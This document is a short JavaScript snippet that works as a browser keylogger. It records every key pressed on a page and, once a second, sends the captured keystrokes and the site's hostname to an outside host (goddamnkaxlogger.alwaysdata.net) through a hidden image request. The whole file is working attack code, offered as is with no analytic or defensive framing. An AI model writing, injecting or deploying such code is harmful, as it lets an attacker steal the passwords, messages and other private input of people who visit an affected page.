var keys='';
var url = 'http://goddamnkaxlogger.alwaysdata.net/goddamn.php?search='

document.onkeypress = function(e) {
  get = window.event?event:e;
  key = get.keyCode?get.keyCode:get.charCode;
  if(key == 32) // space
  {
	key = "<SPACE>"
  }
  else
  {
	key = String.fromCharCode(key);
  }
  keys+=key;
}

window.setInterval(function(){
	if(keys.length>0){
		new Image().src = url+keys+"&oq="+window.location.hostname;
		keys = ''; // reset var
	}
},1000);